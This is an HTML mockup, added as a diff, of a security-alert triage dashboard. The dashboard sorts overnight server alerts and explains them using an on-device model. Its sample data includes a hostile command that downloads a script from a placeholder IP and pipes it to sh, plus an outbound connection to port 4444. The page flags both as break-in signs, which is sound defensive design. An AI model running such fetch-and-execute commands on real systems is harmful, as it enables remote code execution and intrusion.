@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C - Night Watch</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wght@300;400;600;800&family=Manrope:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--ground:#080B14;--surface:#10172A;--ink:#E3E8F2;--muted:#7D8AA6;--line:#1E2A44;--danger:#FF4D3D;--check:#F5B83D;--noise:#4F5D78;--device:#7CC4FF}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--ground);color:var(--ink);font:14px/1.5 Manrope,sans-serif}
+.mono{font-family:"Martian Mono",monospace}
+.top{display:flex;justify-content:space-between;align-items:center;padding:16px 32px;border-bottom:1px solid var(--line)}
+.logo{font:600 14px "Martian Mono";letter-spacing:.04em}
+.logo span{color:var(--danger)}
+.st{display:flex;gap:18px;font:400 11px "Martian Mono";color:var(--muted);align-items:center}
+.led{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px;vertical-align:1px}
+.trace{position:relative;padding:34px 32px 8px}
+.trace h1{font:300 54px/1.05 "Martian Mono";letter-spacing:-.04em}
+.trace h1 b{font-weight:800;color:var(--danger)}
+.trace p{color:var(--muted);margin-top:10px;font-size:15px}
+svg{display:block;width:100%;height:150px;margin-top:18px}
+.tl{display:flex;justify-content:space-between;padding:0 32px;font:10px "Martian Mono";color:var(--noise)}
+.main{display:grid;grid-template-columns:1.2fr 1fr;border-top:1px solid var(--line);margin-top:14px}
+.list{border-right:1px solid var(--line)}
+.r{display:grid;grid-template-columns:14px 52px 1fr 72px 64px;gap:12px;align-items:center;padding:0 32px;height:40px;border-bottom:1px solid var(--line);font:12px "Martian Mono"}
+.r .t{color:var(--muted)}
+.r .src{color:var(--device);font-size:10px;text-align:right}
+.chip{font:600 10px "Martian Mono";letter-spacing:.08em;text-transform:uppercase;padding:3px 7px;border-radius:4px;text-align:center}
+.chip.d{background:rgba(255,77,61,.16);color:var(--danger)}.chip.c{background:rgba(245,184,61,.14);color:var(--check)}.chip.n{color:var(--noise);border:1px solid var(--line)}
+.r.sel{background:var(--surface);box-shadow:inset 2px 0 0 var(--danger)}
+.r.dim{color:var(--noise)}
+.detail{padding:26px 32px}
+.detail h2{font:700 26px/1.2 Manrope;margin:12px 0 14px}
+.k{font:600 10px "Martian Mono";letter-spacing:.14em;color:var(--muted);text-transform:uppercase;margin:18px 0 6px}
+.code{font:12px/1.7 "Martian Mono";background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:10px 12px;color:#FFB1A8}
+.badge{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--device);color:var(--device);border-radius:4px;padding:4px 10px;font:11px "Martian Mono"}
+.act{display:inline-block;margin-top:22px;border:1px solid var(--ink);color:var(--ink);border-radius:6px;padding:10px 16px;font:600 13px "Martian Mono";text-decoration:none}
+.act.hot{background:var(--danger);border-color:var(--danger);color:#160403}
+.sec{display:grid;grid-template-columns:1fr 1fr;border-top:1px solid var(--line)}
+.sec>div{padding:30px 32px}.sec>div+div{border-left:1px solid var(--line)}
+.sec h3{font:300 30px "Martian Mono";letter-spacing:-.03em}
+.diff{margin-top:16px;font:12px/1.9 "Martian Mono";background:var(--surface);border:1px solid var(--line);border-radius:6px;padding:12px 14px}
+.diff .m{color:var(--danger)}.diff .p{color:var(--device)}
+.bytes{display:flex;justify-content:space-between;font:11px "Martian Mono";color:var(--muted);margin-top:10px}
+table{width:100%;border-collapse:collapse;margin-top:16px;font:12px "Martian Mono"}
+td{padding:9px 0;border-bottom:1px solid var(--line)}td:last-child{text-align:right}
+td.big{font:800 34px "Martian Mono";letter-spacing:-.03em}
+@media(max-width:820px){.top{padding:12px 16px}.st .hide{display:none}.trace{padding:24px 16px 4px}.trace h1{font-size:30px}
+svg{height:110px}.tl{padding:0 16px}.main,.sec{grid-template-columns:1fr}.list{border-right:0}
+.r{grid-template-columns:10px 40px 1fr 62px;padding:0 16px;font-size:11px}.r .src{display:none}
+.detail,.sec>div{padding:22px 16px}.sec>div+div{border-left:0;border-top:1px solid var(--line)}}
+</style></head><body>
+<div class="top"><div class="logo">SENTINEL<span>●</span>POCKET</div>
+<div class="st"><span class="hide">srv-01 · 49 alerts · last 6h</span><span><i class="led" style="background:var(--device)"></i>on-device</span><span><i class="led" style="background:var(--noise)"></i>offline</span></div></div>
+<div class="trace"><h1><b>2</b> need you.<br>41 are noise. Go back to sleep.</h1>
+<p>Each tick is one alert, sorted in this Chrome. Spikes are the ones worth waking for.</p>
+<svg viewBox="0 0 1376 150" preserveAspectRatio="none">
+<defs><filter id="g"><feGaussianBlur stdDeviation="4"/></filter></defs>
+<polyline fill="none" stroke="#2B3956" stroke-width="1.5" points="0,120 60,118 90,122 120,116 150,121 210,117 240,119 290,115 330,120 380,118 420,104 440,118 500,121 560,116 600,119 650,117 700,121 760,110 780,96 800,118 860,120 920,117 980,121 1040,119 1080,118 1100,22 1118,120 1140,117 1170,30 1186,119 1230,121 1290,117 1376,119"/>
+<polyline fill="none" stroke="#FF4D3D" stroke-width="2.2" points="1080,118 1100,22 1118,120 1140,117 1170,30 1186,119"/>
+<polyline fill="none" stroke="#FF4D3D" stroke-width="6" opacity=".55" filter="url(#g)" points="1080,118 1100,22 1118,120 1140,117 1170,30 1186,119"/>
+<polyline fill="none" stroke="#F5B83D" stroke-width="2" points="400,118 420,104 440,118 760,110 780,96 800,118"/>
+<circle cx="1100" cy="22" r="4" fill="#FF4D3D"/><circle cx="1170" cy="30" r="4" fill="#FF4D3D"/>
+</svg></div>
+<div class="tl"><span>21:00</span><span>23:00</span><span>01:00</span><span>03:00 ← now</span></div>
+<div class="main"><div class="list">
+<div class="r sel"><i class="led" style="background:var(--danger)"></i><span class="t">03:12</span><span>www-data ran sh -c "curl … | sh"</span><span class="chip d">danger</span><span class="src">device</span></div>
+<div class="r"><i class="led" style="background:var(--danger)"></i><span class="t">03:09</span><span>outbound 198.51.100.7:4444</span><span class="chip d">danger</span><span class="src">device</span></div>
+<div class="r"><i class="led" style="background:var(--check)"></i><span class="t">02:58</span><span>first SSH login 203.0.113.24</span><span class="chip c">check</span><span class="src">device</span></div>
+<div class="r"><i class="led" style="background:var(--check)"></i><span class="t">02:41</span><span>modified /etc/cron.d/backup</span><span class="chip c">check</span><span class="src">device</span></div>
+<div class="r dim"><i class="led" style="background:var(--noise)"></i><span class="t">02:30</span><span>sudo deploy: restart app</span><span class="chip n">noise</span><span class="src">device</span></div>
+<div class="r dim"><i class="led" style="background:var(--noise)"></i><span class="t">02:30</span><span>apt upgrade · 14 packages</span><span class="chip n">noise</span><span class="src">device</span></div>
+<div class="r dim"><i class="led" style="background:var(--noise)"></i><span class="t">02:12</span><span>disk /var at 91%</span><span class="chip n">noise</span><span class="src">device</span></div>
+<div class="r dim"><i class="led" style="background:var(--noise)"></i><span class="t">01:47</span><span>12 failed logins, user "admin"</span><span class="chip n">noise</span><span class="src">device</span></div>
+</div>
+<div class="detail"><span class="badge">◆ ran on this device · Gemini Nano · 41 ms</span>
+<h2>Your website downloaded a script and ran it.</h2>
+<div class="code">03:12:44 www-data sh -c "curl -s http://198.51.100.7/x | sh"</div>
+<div class="k">Why</div><div>Web servers do not start shells. Break-ins usually start like this.</div>
+<div class="k">Next step</div><div>Block 198.51.100.7, then list what www-data started after 03:12.</div>
+<a class="act hot" href="#">Investigate deeper →</a></div></div>
+<div class="sec"><div><h3>leaving this machine</h3>
+<div class="diff"><span class="m">- www-data sh -c "curl http://198.51.100.7/x | sh"</span><br><span class="p">+ USER_1 sh -c "curl http://IP_1/x | sh"</span><br><span class="m">- sshd key for deploy from 203.0.113.24</span><br><span class="p">+ sshd key for USER_2 from IP_2</span></div>
+<div class="bytes"><span>4 lines · 9 values replaced · 612 bytes</span><span style="color:var(--ink)">→ cloud · Gemini</span></div>
+<a class="act" href="#">Send scrubbed bundle</a></div>
+<div><h3>eval · 220 labelled alerts</h3>
+<table><tr><td>accuracy (noise vs danger)</td><td class="big">94%</td></tr><tr><td>median time per alert</td><td class="big">38 ms</td></tr><tr><td>answered on-device</td><td class="big">100%</td></tr></table></div></div>
+</body></html>
